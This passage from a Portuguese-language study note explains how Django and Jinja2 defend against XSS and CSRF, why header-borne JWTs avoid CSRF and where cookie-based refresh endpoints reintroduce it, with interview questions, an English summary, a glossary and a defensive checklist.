> Sim, no endpoint de refresh especificamente. Se o refresh token vive num cookie `HttpOnly` (padrão recomendado, exatamente para reduzir a janela de exposição a XSS), o endpoint que consome esse cookie — normalmente `POST /auth/refresh` — volta a ter a mesma superfície de CSRF de qualquer endpoint autenticado por cookie, mesmo que todo o resto da API use JWT em header sem cookie nenhum. A defesa é a mesma de sempre (`SameSite=Strict` no cookie de refresh, já que ele só precisa ser enviado pelo próprio frontend legítimo, nunca por navegação de terceiro) — o ponto é não generalizar "minha API usa JWT em header" para "toda minha API está livre de CSRF" sem checar, endpoint por endpoint, onde cada credencial realmente viaja.

## Em entrevista

- **"Como o Django protege contra XSS por padrão, e como isso se desliga?"** Autoescape ligado por padrão em todo template — toda variável interpolada com `{{ }}` é escapada, então HTML injetado por usuário vira texto literal, não tag executável. Desliga com `mark_safe()` no código Python (marca um valor específico) ou `{% autoescape off %}` no template (desliga um bloco inteiro) — os dois são declarações de confiança, não sanitização; a correção real é sanitizar com allowlist (`bleach`) antes de marcar como seguro.
- **"Diferença entre XSS refletido e armazenado?"** Refletido: o payload viaja na própria requisição (query string) e é imediatamente refletido na resposta, sem persistência — exige convencer a vítima a clicar num link específico por ataque. Armazenado: o payload é salvo (banco de dados, comentário, bio) e servido para qualquer visitante futuro sem ação extra do atacante — mais grave porque escala automaticamente.
- **"Por que uma API JWT no header Authorization é imune a CSRF?"** CSRF depende do navegador anexar automaticamente uma credencial (cookie) a qualquer requisição para o domínio de destino, mesmo cross-site. Não existe mecanismo equivalente para headers HTTP customizados — um `<form>` HTML não consegue setar `Authorization`, e uma requisição `fetch()` de outra origem esbarra em CORS antes de conseguir. A imunidade vem de onde o token viaja, não do formato do token — um JWT guardado em cookie volta a ser vulnerável.
- **"Minha API só devolve JSON — preciso me preocupar com XSS?"** Estruturalmente, muito menos: o navegador não interpreta `application/json` como HTML executável. O risco residual é no frontend que consome essa API — se ele renderizar um campo como HTML sem sanitizar (`dangerouslySetInnerHTML` sem `bleach`/`DOMPurify`), o XSS acontece ali, não na API. Uma API bem desenhada ainda sanitiza campos de texto livre gerados por usuário, como defesa em profundidade contra um frontend descuidado.

> [!question]- O entrevistador pergunta: "e se eu desabilitar CORS completamente (`Access-Control-Allow-Origin: *`) na minha API JWT-em-header, ainda estou protegido de CSRF?"
> Sim, ainda estaria — CORS e CSRF resolvem problemas diferentes, e é importante não confundir os dois na resposta. `Access-Control-Allow-Origin: *` controla se o **JavaScript de outra origem consegue ler a resposta** de uma requisição — não controla se o navegador anexa uma credencial automaticamente. Como não existe credencial pra anexar automaticamente num header customizado, o ataque de CSRF clássico (via `<form>` auto-submit ou `fetch()` sem header de auth) continua falhando, CORS aberto ou não. Dito isso, CORS aberto de propósito ("`*`" em produção, para qualquer origem) é uma configuração perigosa por outro motivo, fora do escopo de CSRF: qualquer site malicioso consegue ler a resposta de qualquer requisição que a vítima disparar contra a API, se o frontend legítimo mandar o token via alguma forma que o navegador replique automaticamente — o que reforça, de novo, que a segurança real está em nunca deixar o token viajar de forma automática, não em CORS isoladamente.

## How to explain it in English

> "XSS and CSRF exploit two different trust boundaries. XSS injects executable script into HTML someone else's browser renders — Jinja2 and Django Templates autoescape every interpolated variable by default, so the fix is really about never turning that off (`|safe`, `mark_safe()`) for user-controlled input without sanitizing it first with an allowlist library like `bleach`. Pure JSON APIs are much safer against XSS by construction — a browser doesn't execute `application/json` as HTML — though the risk resurfaces if the frontend renders a field as raw HTML without sanitizing, which is a frontend bug, not an API bug. CSRF is structural, not about escaping: the browser attaches cookies automatically to any cross-site request, which is exactly why Django's `CsrfViewMiddleware` plus a synchronized token exists. The key insight for a JWT-in-header API is that this automatic-attachment behavior only applies to cookies — there's no browser mechanism that replicates a custom `Authorization` header on a cross-site request, so an API that authenticates that way is structurally immune to CSRF, no token needed. The moment that same JWT moves into a cookie, though, it inherits the exact same CSRF exposure a session ID would."

| PT-BR | English |
|---|---|
| Escrita em script entre sites | Cross-Site Scripting (XSS) |
| Falsificação de requisição entre sites | Cross-Site Request Forgery (CSRF) |
| XSS refletido | Reflected XSS |
| XSS armazenado | Stored XSS |
| Escape automático | Autoescape |
| Marcar como seguro | Mark as safe |
| Sanitização com lista de permissão | Allowlist sanitization |
| Token sincronizador | Synchronizer token |
| Cookie de submissão dupla | Double-submit cookie |
| Imunidade estrutural | Structural immunity |
| Compartilhamento de recursos entre origens | Cross-Origin Resource Sharing (CORS) |

## Síntese e checklist

O mecanismo central desta nota, em ordem:

1. **XSS** explora HTML não escapado — Jinja2 e Django Templates já escapam por padrão; `|safe`/`mark_safe()` desligam essa proteção e só deveriam ser usados sobre conteúdo já sanitizado por allowlist (`bleach`), nunca sobre input cru de usuário.
2. **XSS refletido** viaja na requisição, sem persistência; **XSS armazenado** persiste no banco e ataca qualquer visitante futuro — o segundo é estruturalmente mais grave.
3. **APIs JSON puras** são muito menos expostas a XSS, porque o navegador não executa `application/json` como HTML — mas o risco reaparece no frontend, se ele renderizar campos como HTML sem sanitizar.
4. **CSRF** explora o envio automático de cookies pelo navegador em requisições cross-site — o Django resolve isso com `CsrfViewMiddleware` mais `{% csrf_token %}`, no padrão synchronizer token.
5. **JWT no header `Authorization`** é estruturalmente imune a CSRF, porque não existe mecanismo do navegador que replique um header customizado numa requisição forjada — a imunidade vem do transporte, não do formato do token.
6. O mesmo JWT, se movido para um cookie, **reganha** a exposição a CSRF de uma sessão tradicional — o que importa, endpoint por endpoint, é onde cada credencial realmente viaja.

Checklist rápido antes de considerar essa camada de segurança coberta:

- [ ] Todo campo que aceita HTML de usuário passa por `bleach.clean()` (ou equivalente) antes de qualquer `mark_safe()`/`|safe`?
- [ ] Nenhum `@csrf_exempt` foi aplicado a um endpoint que ainda aceita cookie de sessão como autenticação?
- [ ] O frontend que consome a API sanitiza qualquer campo de texto livre antes de usar `dangerouslySetInnerHTML`/`v-html`?
- [ ] O token de autenticação da API viaja no header `Authorization`, não em cookie — ou, se viaja em cookie por algum motivo de arquitetura, tem `SameSite`/token CSRF equivalente a uma sessão tradicional?
- [ ] Se existe um endpoint de refresh token baseado em cookie, ele tem `SameSite=Strict` e não foi esquecido na análise de CSRF só porque "o resto da API usa JWT em header"?
- [ ] `Content-Type: application/json` está explícito em todas as respostas de API, com `X-Content-Type-Options: nosniff` como camada extra?

## Veja também

- [[01 - OWASP Top 10 aplicado a Python web — o mapa|01 — OWASP Top 10 aplicado a Python web]] — mapa de navegação deste galho; XSS e CSRF aparecem lá como categorias do Top 10, aprofundadas aqui.
- [[02 - Injeção — SQL, template, comando e deserialização insegura|02 — Injeção]] — nota irmã; injeção de template (SSTI) é um vetor de execução no servidor, diferente de XSS (execução no navegador do cliente), mas os dois envolvem interpolação insegura em templates.
- [[03-Dominios/Engenharia/Auth e Identidade/1 - Fundamentos de identidade/02 - Sessões e cookies — auth stateful|Sessões e cookies — auth stateful]] — mecanismo completo de CSRF contra sessão, flags de cookie, `SameSite`, synchronizer/double-submit token; esta nota assume esse vocabulário.
- [[03-Dominios/Engenharia/Auth e Identidade/1 - Fundamentos de identidade/03 - JWT e a família de tokens|JWT e a família de tokens]] — anatomia do JWT (assinatura, claims, JWS/JWE); esta nota só usa o fato de que ele viaja no header, sem repetir o mecanismo interno.
- [[03-Dominios/Tecnologia/Python/Segurança/index|Segurança (Galho 11)]] — MOC deste galho.
- [[03-Dominios/Tecnologia/Python/Web e APIs REST/06 - Tratamento de erros e respostas HTTP padronizadas|Tratamento de erros e respostas HTTP padronizadas]] — Galho 10; 401/403 (o retorno de uma rejeição CSRF ou de autenticação ausente) se encaixa no mesmo contrato de erro descrito lá.

## Fontes

- OWASP. *Cross Site Scripting Prevention Cheat Sheet*. cheatsheetseries.owasp.org. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html (acessado em 2026-07-11) — taxonomia de XSS, contextual output encoding como defesa primária.
- OWASP. *Cross-Site Request Forgery Prevention Cheat Sheet*. cheatsheetseries.owasp.org. https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html (acessado em 2026-07-11) — synchronizer token pattern, double-submit cookie, limitações do `SameSite`.
- Django Software Foundation. *Cross Site Request Forgery protection*. docs.djangoproject.com. https://docs.djangoproject.com/en/stable/ref/csrf/ (acessado em 2026-07-11) — `CsrfViewMiddleware`, `{% csrf_token %}`, `@csrf_exempt`.
- Django Software Foundation. *Cross site scripting (XSS) protection*. docs.djangoproject.com. https://docs.djangoproject.com/en/stable/topics/security/#cross-site-scripting-xss-protection (acessado em 2026-07-11) — autoescape, `mark_safe()`, `{% autoescape off %}`.
- Jinja2 / Pallets Projects. *Template Designer Documentation — Autoescaping*. jinja.palletsprojects.com. https://jinja.palletsprojects.com/en/stable/templates/#html-escaping (acessado em 2026-07-11) — comportamento de autoescape e o filtro `|safe`.
- Mozilla. *bleach — allowlist-based HTML sanitizing library*. github.com/mozilla/bleach. https://github.com/mozilla/bleach (acessado em 2026-07-11) — API de `bleach.clean()`, allowlist de tags/atributos.
- MDN Web Docs. *Content-Type Options: X-Content-Type-Options*. developer.mozilla.org. https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-Content-Type-Options (acessado em 2026-07-11) — mitigação de content-type sniffing.
- Real Python. *Preventing SQL Injection Attacks With Python* (seção sobre defesa em profundidade e sanitização de entrada aplicável a XSS). realpython.com. https://realpython.com/prevent-python-sql-injection/ (acessado em 2026-07-11) — princípios de allowlist vs. denylist reaproveitados nesta nota.
- [[03-Dominios/Engenharia/Auth e Identidade/1 - Fundamentos de identidade/02 - Sessões e cookies — auth stateful|Sessões e cookies — auth stateful]] — nota irmã de domínio, referenciada para o mecanismo completo de CSRF contra cookie de sessão.

Consultado em 2026-07-11.
